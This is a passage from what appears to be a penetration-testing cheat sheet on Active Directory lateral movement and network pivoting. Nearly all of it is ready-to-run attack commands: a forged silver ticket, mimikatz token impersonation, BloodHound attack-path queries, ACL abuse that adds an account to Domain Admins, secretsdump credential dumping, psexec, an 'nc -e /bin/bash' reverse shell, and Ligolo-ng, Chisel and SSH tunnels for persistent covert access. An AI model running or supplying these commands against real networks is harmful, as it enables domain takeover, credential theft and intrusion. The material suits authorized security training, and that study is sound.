impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -spn cifs/server01.domain.local Administrator
```

### 4.3 Admin Session Exploitation

**Session Enumeration**

```powershell
# Current logged on users (local)
query user
query session
qwinsta

# Remote session enumeration
query user /server:10.11.1.30
qwinsta /server:10.11.1.30

# Net commands
net session
net session \\10.11.1.30

# WMI session enumeration
Get-WmiObject -Class Win32_LoggedOnUser -ComputerName 10.11.1.30
Get-WmiObject -Class Win32_ComputerSystem -ComputerName 10.11.1.30 | Select-Object UserName

# CIM session
Get-CimInstance -ClassName Win32_LoggedOnUser -ComputerName 10.11.1.30

# PowerView session checking
Import-Module .\PowerView.ps1
Get-NetSession -ComputerName 10.11.1.30
Get-NetLoggedon -ComputerName 10.11.1.30
Invoke-UserHunter
Invoke-UserHunter -ComputerName 10.11.1.30
Invoke-UserHunter -GroupName "Domain Admins"

# Find admin sessions
Find-DomainUserLocation
Find-DomainUserLocation -UserIdentity administrator

# SharpHound session collection
.\SharpHound.exe -c Session,LoggedOn
.\SharpHound.exe --CollectionMethods Session
```

**Linux Session Enumeration**

```bash
# CrackMapExec session enumeration
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions
cme smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Impacket session enumeration
impacket-lookupsid domain.local/user:password@10.11.1.10
lookupsid.py domain.local/user:password@10.11.1.10

# NetExec (formerly CrackMapExec fork)
netexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Enum4linux session enumeration
enum4linux -a 10.11.1.10
```

**Token Impersonation**

```powershell
# List available tokens
mimikatz # token::list
mimikatz # token::elevate

# Impersonate domain admin token
mimikatz # token::elevate /domainadmin

# Incognito (Metasploit)
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator

# PowerShell
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"
Invoke-TokenManipulation -Enumerate

# Rubeus token manipulation
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e7
```

### 4.4 BloodHound-Informed Movement

**BloodHound Analysis Queries**

```cypher
# Find shortest path to Domain Admins
MATCH (m:Computer),(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((m)-[*1..]->(n)) RETURN p

# Find systems where Domain Admins have sessions
MATCH (c:Computer)-[r:HasSession]->(u:User)-[r2:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name

# Find users with DCSync rights
MATCH (u:User)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalname

# Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find users with admin rights on computers
MATCH (u:User)-[r:AdminTo]->(c:Computer) RETURN u.name, c.name

# Find computers with sessions from high-value targets
MATCH (c:Computer)-[r:HasSession]->(u:User {highvalue:true}) RETURN c.name, u.name

# Find GPO paths to compromise
MATCH p=(g:GPO)-[r:GpLink]->(o:OU) RETURN p

# Find who can RDP to what
MATCH (u:User)-[r:CanRDP]->(c:Computer) RETURN u.name, c.name

# Find who can PS Remote to what
MATCH (u:User)-[r:CanPSRemote]->(c:Computer) RETURN u.name, c.name

# Find objects owned by users
MATCH (u:User)-[r:Owns]->(o) RETURN u.name, o.name, labels(o)

# Find ACL attack paths
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(o) RETURN u.name, type(r), o.name

# Find computers where current user has admin
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[r:AdminTo]->(c:Computer) RETURN c.name
```

**Path-Based Targeting**

```powershell
# PowerView queries based on BloodHound findings
Import-Module .\PowerView.ps1

# Find computers with admin sessions
Get-DomainComputer | Get-NetSession | Where-Object {$_.UserName -like "*admin*"}

# Find computers where specific user has session
Find-DomainUserLocation -UserIdentity "administrator"

# Find local admin access
Find-LocalAdminAccess
Find-LocalAdminAccess -ComputerName "server01.domain.local"

# Check ACLs for specific object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find modifiable GPOs
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth

# Find principals with DCSync rights
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

**ACL-Based Movement**

```powershell
# GenericAll abuse
# If you have GenericAll on a user
net user target_user NewPassword123! /domain

# Set SPN for Kerberoasting
setspn -s HTTP/fake.domain.local target_user

# If you have GenericAll on a computer
# Add computer to domain (requires computer account)

# GenericWrite abuse
# Set script path for user
Set-ADUser -Identity target_user -ScriptPath "\\attacker\share\evil.bat"

# WriteOwner abuse
# Change owner
Set-DomainObjectOwner -Identity target_user -OwnerIdentity attacker_user

# WriteDacl abuse
# Add GenericAll rights for yourself
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker_user -Rights All

# ForceChangePassword
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity target_user -NewPassword $NewPassword -Reset

# AddMembers (Group)
Add-ADGroupMember -Identity "Domain Admins" -Members attacker_user
net group "Domain Admins" attacker_user /add /domain

# ReadLAPSPassword
Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# AllExtendedRights
# Can do anything - similar to GenericAll
```

## 5 Port Forwarding and Pivoting

### Understanding Pivoting Terminology
#### Local Port Forwarding
**What:** Forward a port from the attacker machine to a service on the internal network through the pivot host.

**Analogy:** "Bring that internal service to my machine."

**Example:** Access an internal web server (10.10.10.5:80) from your Kali machine (192.168.1.100).

```
Attacker (localhost:8080) → Pivot (10.11.1.5) → Target (10.10.10.5:80)
Access via: http://localhost:8080
```

**Use Case:** Accessing a specific service (RDP, HTTP, SMB, SQL) on an internal host.

#### Remote Port Forwarding
**What:** Forward a port from the pivot host back to the attacker machine.

**Analogy:** "Let the internal network reach out to me."

**Example:** Internal host connects to your payload handler.

```
Target (10.10.10.5) → Pivot (10.11.1.5) → Attacker (192.168.1.100:4444)
```

**Use Case:** Catching reverse shells from deeply nested networks, exfiltration.

#### Dynamic Port Forwarding (SOCKS Proxy)
**What:** Create a SOCKS proxy that routes all traffic through the pivot host.

**Analogy:** "Route any connection I make through the pivot."

**Example:** Use any tool (nmap, curl, proxychains) to access the entire internal network.

```
Attacker → SOCKS Proxy (localhost:1080) → Pivot (10.11.1.5) → Any Internal Host
```

**Use Case:** Flexible access to multiple services/hosts without setting up individual port forwards.

#### Pivoting (Network-Level Routing)
**What:** Add routing rules to access an entire subnet as if you were directly connected.

**Analogy:** "Make my computer think it's on that internal network."

**Example:** Full subnet routing via TUN/TAP interface.

```
Attacker routes 10.10.10.0/24 → TUN interface → Pivot (10.11.1.5) → Internal Network
```

**Use Case:** Running tools that don't support SOCKS (like most scanners), seamless access to entire subnets.

### Understand Your Pivot Host

Before choosing a tunneling method, gather information about the compromised host:

```bash
# Linux - Check network interfaces and routing
ip addr
ip route
ifconfig
route -n
arp -a

# Discover internal subnets (quick ping sweep)
for i in {1..254}; do ping -c1 -W1 10.10.10.$i &>/dev/null && echo "10.10.10.$i is up"; done

# Check for multiple network interfaces
ip link show
netstat -rn
```

```cmd
# Windows - Check network interfaces
ipconfig /all
route print
arp -a

# Quick subnet scan
for /L %i in (1,1,254) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up
```

```powershell
# PowerShell network discovery
Get-NetIPAddress
Get-NetRoute
Get-NetNeighbor

# Quick subnet scan
1..254 | ForEach-Object { Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet } | Where-Object { $_ -eq $true }
```

### Tool Selection

| Tool | Type | Use Case | Complexity | Platform | SOCKS Support |
|------|------|----------|------------|----------|---------------|
| **Ligolo-ng** ⭐ | Full Routing | Complete subnet access, multi-hop, VPN-like | Medium | Linux/Windows | No (Better) |
| **SSH** | Port Forward/SOCKS | Single ports or SOCKS when SSH is available | Low | Linux/Windows | Yes (SOCKS4/5) |
| **Chisel** | SOCKS/Port Forward | Cross-platform SOCKS/ports, Windows friendly | Medium | Linux/Windows | Yes (SOCKS5) |
| **Metasploit** | Port Forward/Routes | Built-in pivoting with Meterpreter sessions | Medium | All (via session) | Yes (via auxiliary) |
| **Proxychains** | SOCKS Wrapper | Wrapper for non-SOCKS tools | Low | Linux | Requires SOCKS proxy |
| **Socat** | TCP Relay | Simple port-to-port relay | Low | Linux/Windows | No |

### Comparison Summary

| Feature | Ligolo-ng | SSH | Chisel | Metasploit | Proxychains |
|---------|-----------|-----|--------|------------|-------------|
| **Layer 3 Routing** | ✅ | ❌ | ❌ | ✅ | ❌ |
| **SOCKS Proxy** | ❌ | ✅ | ✅ | ✅ | Requires SOCKS |
| **Port Forward** | ✅ | ✅ | ✅ | ✅ | N/A |
| **Windows Support** | ✅ | Limited | ✅ | ✅ | ❌ |
| **Multi-Hop** | ✅ | ✅ | ✅ | ✅ | ✅ |
| **No Extra Tools** | ❌ | ✅ | ❌ | ❌ | ❌ |
| **Ease of Use** | Medium | Easy | Easy | Medium | Easy |
| **Best For** | Full access | Quick pivots | Windows targets | Pentests | Tool wrapping |
---

## 5.1 Ligolo-ng (Recommended)

**Why Ligolo-ng:**
- Creates a full Layer 3 tunnel (TUN interface)
- No need for proxychains or SOCKS configuration
- Works with all tools (nmap, crackmapexec, etc.)
- Supports multi-hop pivoting
- Clean and fast performance

### Setup

**Create TUN Interface (One-Time Setup)**

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Basic Usage

**Start Proxy (Attacker Machine)**

```bash
cd /opt/ligolo-ng
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# Alternative with specific interface
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -allow-domains *.local
```

**Deploy Agent (Compromised Host)**

```bash
# Linux - Foreground
chmod +x agent
./agent -connect <LHOST>:11601 -ignore-cert

# Linux - Background
nohup ./agent -connect <LHOST>:11601 -ignore-cert &>/dev/null &

# Check if running
ps aux | grep agent
```

```cmd
# Windows - Foreground
agent.exe -connect <LHOST>:11601 -ignore-cert

# Windows - Background
Start-Process -NoNewWindow -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert"
```

**Activate Tunnel**

```bash
# In proxy console
ligolo-ng » session                    # List available sessions
ligolo-ng » session 0                  # Select session 0
[Agent : user@host] » ifconfig         # Show agent's network interfaces
[Agent : user@host] » start            # Start the tunnel
```

**Add Routes (New Terminal)**

```bash
# Add route to internal network
sudo ip route add <INTERNAL_SUBNET_A> dev ligolo

# Verify route
ip route | grep ligolo
```

### Port Forwarding (Listeners)

What happens:
- A port is opened remotely on the agent / pivot host
- Any connection to that port is forwarded back to the attacker / proxy
- The forwarded connection lands on the attacker at `127.0.0.1:<LPORT>`

**Create Listeners**

```bash
# In agent session
# Create a listener on the pivot host that forwards incoming connections through the Ligolo tunnel to the proxy (attacker) machine.
# Client → Pivot Host:<PIVOT_PORT> → Ligolo Tunnel → Proxy:<LPORT>
[Agent : user@host] » listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<LPORT>

# List active listeners
[Agent : user@host] » listener_list

# Stop specific listener
[Agent : user@host] » listener_stop 0
```

**Access Forwarded Services**

```bash
# HTTP service running locally on attacker
curl http://127.0.0.1:<LPORT>

# RDP
xfreerdp /v:127.0.0.1:<LPORT> /u:<USER> /p:<PASSWORD> /cert:ignore

# SQL Server
impacket-mssqlclient <USER>:<PASSWORD>@127.0.0.1 -port <LPORT>

# SSH
ssh <USER>@127.0.0.1 -p <LPORT>
```

### Multi-Hop Pivoting

**Scenario:**
```
Attacker → Pivot A (<PIVOT_A_IP>) → Pivot B (<PIVOT_B_IP>) → Deep Network (<INTERNAL_SUBNET_B>)
```

**Step 1: First Hop**

```bash
# Start proxy on attacker
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# Deploy agent on Pivot A
./agent -connect <LHOST>:11601 -ignore-cert

# In proxy console
ligolo-ng » session 0
[Agent : user@pivotA] » start

# Add route to Pivot A's network
sudo ip route add <INTERNAL_SUBNET_A> dev ligolo
```

**Step 2: Second Hop**

```bash
# In agent session
ligolo-ng » session 0          # Select Pivot A
[Agent : user@pivotA] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp # Listener on port 11601

# Run on Pivot B
./agent -connect <PIVOT_A_IP>:11601 -ignore-cert

# In proxy console (new session appears)
ligolo-ng » session 1
[Agent : user@pivotB] » start

# Add route to deep network
sudo ip route add <INTERNAL_SUBNET_B> dev ligolo
```

---

## 5.2 SSH Tunneling

**Why SSH:**
- Available on most Linux systems
- Simple and reliable
- Encrypted traffic
- No additional tools needed

### Local Port Forwarding

**Concept:** Forward a local port to a remote service through SSH.

```bash
# Basic syntax
ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>

# Bind to all interfaces (not just localhost)
ssh -L 0.0.0.0:<LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>

# Background mode (no shell)
ssh -f -N -L <LPORT>>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>

# With SSH key
ssh -i /path/to/key -L <LPORT>>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>

# Keep alive
ssh -o ServerAliveInterval=60 -L <LPORT>>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>
```

**Use Cases:**
```bash
# Forward RDP
ssh -L 3389:<RHOST>:3389 <USER>@<PIVOT_A_IP>
xfreerdp /v:localhost /u:admin /p:password

# Forward SMB
ssh -L 445:<RHOST>:445 <USER>@<PIVOT_A_IP>
smbclient -L localhost -U administrator

# Forward MySQL
ssh -L 3306:<RHOST>:3306 <USER>@<PIVOT_A_IP>
mysql -h 127.0.0.1 -u root -p

# Forward PostgreSQL
ssh -L 5432:<RHOST>:5432 <USER>@<PIVOT_A_IP>
psql -h localhost -U postgres
```

### Dynamic Port Forwarding (SOCKS Proxy)

**Concept:** Create a SOCKS proxy that routes traffic through SSH.

```bash
# Basic SOCKS proxy (SOCKS5 on port 1080)
ssh -D 1080 <USER>@<PIVOT_A_IP>

# Bind to all interfaces
ssh -D 0.0.0.0:1080 <USER>@<PIVOT_A_IP>

# Background mode
ssh -f -N -D 1080 <USER>@<PIVOT_A_IP>

# Custom port
ssh -D 9050 <USER>@<PIVOT_A_IP>

# With specific SOCKS version (SOCKS4)
ssh -D 1080 -4 <USER>@<PIVOT_A_IP>
```

**Use with Proxychains:**

```bash
# Edit /etc/proxychains4.conf
# Add at the end:
# socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT -Pn <INTERNAL_SUBNET_A>
proxychains curl http://<RHOST>
proxychains evil-winrm -i <RHOST> -u <USER> -p <PASSWORD>
proxychains crackmapexec smb <INTERNAL_SUBNET_A> -u <USER> -p <PASSWORD>
```

**Use with Firefox:**
```
1. Open Firefox
2. Settings → Network Settings → Settings
3. Manual proxy configuration
4. SOCKS Host: 127.0.0.1
5. Port: 1080
6. SOCKS v5
7. Check "Proxy DNS when using SOCKS v5"
```

### Remote Port Forwarding

**Concept:** Forward a port from the remote server back to your machine.

```bash
# Basic syntax
ssh -R <RPORT>:localhost:<LPORT> <USER>@<PIVOT_A_IP>

# Bind to all interfaces on remote
ssh -R 0.0.0.0:<RPORT>:localhost:<LPORT> <USER>@<PIVOT_A_IP>

# Reverse SOCKS proxy
ssh -R 1080 <USER>@<PIVOT_A_IP>
# Creates SOCKS proxy on remote that tunnels back to you
```

**Use Case - Catch Reverse Shells:**

```bash
# On attacker machine
# Start listener
nc -lvnp 4444

# Create reverse tunnel
ssh -R 4444:localhost:4444 <USER>@<PIVOT_A_IP>

# On internal target (10.10.10.20)
# Connect to pivot's IP
nc 10.11.1.5 4444 -e /bin/bash
# Shell appears on attacker's nc listener
```

### SSH on Windows (Plink)

```cmd
# Download plink.exe
# https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# Local port forwarding
plink.exe -L <LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP> -pw password

# Dynamic port forwarding
plink.exe -D 1080 <USER>@<PIVOT_A_IP> -pw password

# Remote port forwarding
plink.exe -R <RPORT>:<LHOST>:<LPORT> <USER>@<PIVOT_A_IP> -pw password

# With SSH key
plink.exe -i C:\path\to\key.ppk -L <LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP>

# Background mode (no terminal)
plink.exe -N -L <LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP> -pw password
```

---

## 5.3 Chisel

**Why Chisel:**
- Single binary (easy to transfer)
- Cross-platform (Linux, Windows, macOS)
- Supports SOCKS5
- HTTP/HTTPS tunneling (bypasses firewalls)
- Reverse tunnel support

### Forward Tunnel (SOCKS)

**Attacker Machine (Server):**

```bash
# Start Chisel server
chisel server --port 8000 --reverse

# With authentication
chisel server --port 8000 --reverse --auth user:password

# Specific SOCKS port
chisel server --port 8000 --reverse --socks5
```

**Compromised Host (Client):**

```bash
# Connect and create SOCKS proxy on attacker
chisel client <LHOST>:8000 R:1080:socks

# With authentication
chisel client --auth user:password <LHOST>:8000 R:1080:socks

# Now use proxychains on attacker machine with 127.0.0.1:1080
```

### Forward Tunnel (Port Forwarding)

```bash
# Server on attacker
chisel server --port 8000 --reverse

# Client on compromised host - forward specific port
chisel client <LHOST>:8000 R:<LPORT>:<RHOST>:<RPORT>

# Access via localhost:<LPORT> on attacker machine
```

### Reverse Tunnel

**Compromised Host (Server):**

```bash
# Linux
./chisel server --port 8001 --socks5

# Windows
chisel.exe server --port 8001 --socks5
```

**Attacker Machine (Client):**

```bash
# Connect to compromised host and create local SOCKS
chisel client <PIVOT_A_IP>:8001 socks

# Now SOCKS proxy is on 127.0.0.1:1080
# Use with proxychains
```

### Windows Usage

```cmd
# Start server on attacker (Linux)
chisel server --port 8000 --reverse

# Windows client - SOCKS proxy
chisel.exe client <LHOST>:8000 R:1080:socks

# Windows client - Port forward
chisel.exe client <LHOST>:8000 R:<LPORT>:<RHOST>:<RPORT>

# Background execution
start /B chisel.exe client <LHOST>:8000 R:1080:socks
```

---

## 5.4 Metasploit Framework

**Why Metasploit:**
- Integrated with Meterpreter sessions
- Built-in routing and pivoting
- SOCKS proxy module
- Port forwarding capabilities

### Meterpreter Routes

**Add Route:**

```bash
# In Meterpreter session
meterpreter > run autoroute -s <INTERNAL_SUBNET_A>

# Check routes
meterpreter > run autoroute -p

# Delete route
meterpreter > run autoroute -d <INTERNAL_SUBNET_A>
```

**Background Session and Add Route:**

```bash
# Background the Meterpreter session
meterpreter > background

# Add route through session
msf6 > route add <INTERNAL_SUBNET_A> <METERPRETER_SESSION_ID>

# Verify routes
msf6 > route print

# Remove route
msf6 > route remove <INTERNAL_SUBNET_A> <METERPRETER_SESSION_ID>
```

**Use Modules Through Pivot:**

```bash
# Now all modules will route through the pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <INTERNAL_SUBNET_A>
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80,443,445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

# SMB enumeration
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.<INTERNAL_SUBNET_A>
msf6 auxiliary(scanner/smb/smb_version) > run
```

### Port Forwarding

```bash
# Forward remote port to local (in Meterpreter)
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r <RHOST>

# List forwards
meterpreter > portfwd list

# Delete forward
meterpreter > portfwd delete -l <RPORT>

# Delete all forwards
meterpreter > portfwd flush

# Reverse port forward
meterpreter > portfwd add -R -l <LPORT> -p <RPORT> -L <LHOST>
```

### SOCKS Proxy

```bash
# Background Meterpreter session
meterpreter > background

# Start SOCKS proxy server
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# Add route
msf6 > route add <INTERNAL_SUBNET_A> <METERPRETER_SESSION_ID>

# Now use proxychains with 127.0.0.1:1080
```

**Use SOCKS Proxy:**

```bash
# Configure proxychains (/etc/proxychains4.conf)
# socks5 127.0.0.1 1080

# Use with external tools
proxychains nmap -sT -Pn <INTERNAL_SUBNET_A>
proxychains crackmapexec smb <INTERNAL_SUBNET_A> -u <USER> -p <PASSWORD>
proxychains evil-winrm -i 10.10.10.10 -u <USER> -p <PASSWORD>
```

### Multi-Hop Pivoting

```bash
# Session 1 on Pivot A
msf6 > route add <INTERNAL_SUBNET_A> 1

# Exploit through Pivot A to get Session 2 on Pivot B
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS <RHOST>
msf6 exploit(windows/smb/psexec) > set SMBUser <USER>
msf6 exploit(windows/smb/psexec) > set SMBPass <PASSWORD>
msf6 exploit(windows/smb/psexec) > exploit

# Session 2 established on Pivot B
# Add route through Session 2
msf6 > route add <INTERNAL_SUBNET_B> 2

# Now can access <INTERNAL_SUBNET_B> through both pivots
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <RHOST>
msf6 auxiliary(scanner/portscan/tcp) > run
```

---

## 5.5 Proxychains

**Why Proxychains:**
- Forces network traffic through SOCKS/HTTP proxies
- Works with tools that don't natively support proxies
- Chain multiple proxies together
- DNS resolution through proxy

### Configuration

```bash
# Edit /etc/proxychains4.conf or ~/.proxychains/proxychains.conf

# Dynamic chain (use all proxies in order, skip dead ones)
dynamic_chain

# Strict chain (use all proxies in order, fail if one is down)
#strict_chain

# Random chain (use random proxy from list)
#random_chain

# Proxy DNS requests
proxy_dns

# ProxyList format
# type  host  port [user pass]
[ProxyList]
socks5 127.0.0.1 1080
socks4 127.0.0.1 9050
http 127.0.0.1 8080
```

### Basic Usage

```bash
# Syntax
proxychains <command>
proxychains4 <command>

# Quiet mode (less output)
proxychains -q <command>

# Use specific config file
proxychains -f /path/to/proxychains.conf <command>
```

### Common Use Cases

```bash
# Nmap (TCP connect scan only)
proxychains nmap -sT -Pn <INTERNAL_SUBNET_A>

# Port scan specific ports
proxychains nmap -sT -Pn -p 80,443,445,3389 <INTERNAL_SUBNET_A>

# CrackMapExec
proxychains crackmapexec smb <INTERNAL_SUBNET_A> -u <USER> -p <PASSWORD>
proxychains crackmapexec winrm <RHOST> -u <USER> -p <PASSWORD> -x "whoami"

# Evil-WinRM
proxychains evil-winrm -i <RHOST> -u <USER> -p <PASSWORD>

# Impacket tools
proxychains impacket-psexec <DOMAIN>/<DOMAIN_USER>:<DOMAIN_PASSWORD>@<RHOST>
proxychains impacket-wmiexec <DOMAIN>/<DOMAIN_USER>:<DOMAIN_PASSWORD>@<RHOST>
proxychains impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<DOMAIN_PASSWORD>@<RHOST>

# curl
proxychains curl http://<RHOST>

# SSH
proxychains ssh <USER>@<RHOST>

# RDP
proxychains xfreerdp /v:<RHOST> /u:<USER> /p:<PASSWORD>

# Metasploit
proxychains msfconsole

# SMB
proxychains smbclient -L //<RHOST> -U <USER>
```

### Multiple Proxy Chains

```bash
# Edit proxychains.conf
[ProxyList]
# First pivot
socks5 127.0.0.1 1080

# Second pivot (if you have nested tunnels)
socks5 127.0.0.1 1081
```

### Limitations

Does NOT work with:
- ICMP (ping)
- SYN scans (nmap -sS)
- UDP scans
- Raw sockets

Works with:
- TCP connect scans (`nmap -sT`)
- Application layer protocols (HTTP, SMB, SSH, etc.)
- Most command-line tools

---

## 5.6 Additional Tools

### Socat

**Why Socat:**
- Simple TCP/UDP relay
- Port forwarding without authentication
- Minimal footprint
- Available on most Linux systems

```bash
# Install
apt install socat

# Basic port forwarding
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>

# Fork creates new process for each connection
# Now localhost:<LPORT> forwards to <RHOST>:<RPORT>

# UDP forwarding
socat UDP-LISTEN:<LPORT>,fork UDP:<RHOST>:<RPORT>

#Bind to specific interface
socat TCP-LISTEN:<LPORT>,bind=0.0.0.0,fork TCP:<RHOST>:<RPORT>

# Reverse shell relay
socat TCP-LISTEN:<RPORT>,fork TCP:<LHOST>:<LPORT>

# File transfer relay
socat TCP-LISTEN:9999,reuseaddr,fork OPEN:file.txt,rdonly
```

### SSH Reverse Tunnel with Autossh

**Why Autossh:**
- Maintains persistent SSH tunnels
- Automatically reconnects if connection drops
- Perfect for persistent access

```bash
# Install
apt install autossh

# Persistent reverse SOCKS proxy
autossh -M 0 -N -D 1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" <USER>@<PIVOT_A_IP>

# Persistent reverse port forward
autossh -M 0 -N -R <RPORT>:localhost:<LPORT> -o "ServerAliveInterval 30" <USER>@<PIVOT_A_IP>

# Background mode
autossh -M 0 -f -N -D 1080 <USER>@<PIVOT_A_IP>

# With specific monitoring port
autossh -M 20000 -N -D 1080 <USER>@<PIVOT_A_IP>
```

### SSHuttle

**Why SSHuttle:**
- VPN-like experience over SSH
- Automatic routing
- No root on remote host needed
- Python-based

```bash
# Install
apt install sshuttle

# Basic usage (route entire subnet)
sshuttle -r <USER>@<PIVOT_A_IP> <INTERNAL_SUBNET_A>

# Multiple subnets
sshuttle -r <USER>@<PIVOT_A_IP> <INTERNAL_SUBNET_A> <INTERNAL_SUBNET_B>

# Exclude specific IPs
sshuttle -r user@<PIVOT_A_IP> <INTERNAL_SUBNET_A> -x <RHOST>

# Verbose mode
sshuttle -vr user@<PIVOT_A_IP> <INTERNAL_SUBNET_A>

# DNS through tunnel
sshuttle -r user@<PIVOT_A_IP> <INTERNAL_SUBNET_A> --dns

# Use SSH key
sshuttle -r user@<PIVOT_A_IP> <INTERNAL_SUBNET_A> -e "ssh -i /path/to/key"
```

### Rpivot

**Why Rpivot:**
- Reverse SOCKS proxy
- Useful when you can't connect to pivot directly
- Python-based

```bash
# On attacker machine (server)
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0

# On compromised host (client)
python client.py --server-ip <LHOST> --server-port 9999

# Now SOCKS proxy is available on attacker at 127.0.0.1:1080
# Use with proxychains
```

### Netsh (Windows Native)

```cmd
# Port forwarding on Windows (requires admin)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LPORT> connectaddress=<RHOST> connectport=<RPORT>

# Show port proxies
netsh interface portproxy show all

# Delete port proxy
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=<LPORT>

# Allow through firewall
netsh advfirewall firewall add rule name="Port Forward <LPORT>" dir=in action=allow protocol=TCP localport=<LPORT>
```
